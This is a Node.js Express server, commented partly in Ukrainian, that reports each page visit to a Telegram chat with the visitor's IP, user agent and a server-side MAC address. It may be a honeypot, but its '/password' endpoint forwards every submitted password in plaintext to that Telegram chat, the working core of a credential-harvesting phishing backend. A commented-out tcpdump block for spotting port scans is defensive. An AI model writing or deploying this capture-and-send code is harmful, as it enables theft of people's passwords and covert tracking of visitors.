require('dotenv').config();
const express = require('express');
const { Telegraf } = require('telegraf');
const bodyParser = require('body-parser');
const os = require('os'); // Add this line

const app = express();
// Environment Variables
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

// Middleware
app.use(express.static('public'));
app.use(bodyParser.json());
// Helper function to get MAC address (example only)
const getMacAddress = () => {
    const networkInterfaces = os.networkInterfaces();
    for (const key in networkInterfaces) {
        const interfaces = networkInterfaces[key];
        for (const iface of interfaces) {
            if (iface.mac && iface.mac !== '00:00:00:00:00:00') {
                return iface.mac;
            }
        }
    }
    return 'unknown';
};

// Helper function to log and notify Telegram bot
const notifyBot = async (message) => {
    try {
        await bot.telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, message);
    } catch (error) {
        console.error('Error sending message to Telegram bot:', error);
    }
};

// Alert on page visit
app.get('/', async (req, res) => {
    const userAgent = req.headers['user-agent'] || 'unknown';
    const ip = req.ip;
    const mac = getMacAddress();
    const timestamp = new Date().toISOString();

    const alertMessage = `Сторінку відвідав користувач:
- IP: ${ip}
- MAC: ${mac}
- User-Agent: ${userAgent}
- Timestamp: ${timestamp}`;

    await notifyBot(alertMessage);

    res.sendFile(__dirname + '\\index.html');
});

// Capture password inputs
app.post('/password', async (req, res) => {
    const { password } = req.body;
    if (password) {
        const alertMessage = `Password entered: ${password}`;
        await notifyBot(alertMessage);
        res.status(200).json({ success: true });
    } else {
        res.status(400).json({ success: false, error: 'No password provided' });
    }
});


//

// Port scan detection using Kali Linux
// app.use((req, res, next) => {
//     const scanCommand = `sudo tcpdump -nn -q -c 100`; // Example: Monitor traffic with tcpdump

//     exec(scanCommand, (error, stdout, stderr) => {
//         if (error) {
//             console.error(`Error executing tcpdump: ${error.message}`);
//             return;
//         }
//         if (stderr) {
//             console.error(`tcpdump error: ${stderr}`);
//             return;
//         }

//         const packets = stdout.split('\n');
//         const sourceIPCounts = {};

//         packets.forEach((packet) => {
//             const match = packet.match(/IP (\d+\.\d+\.\d+\.\d+)/);
//             if (match) {
//                 const sourceIP = match[1];
//                 sourceIPCounts[sourceIP] = (sourceIPCounts[sourceIP] || 0) + 1;
//             }
//         });

//         for (const [ip, count] of Object.entries(sourceIPCounts)) {
//             if (count > 10) { // Arbitrary threshold for port scan detection
//                 notifyBot(`Potential port scan detected from IP: ${ip}`);
//             }
//         }
//     });

//     next();
// });

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

// Start Telegram bot
bot.launch();
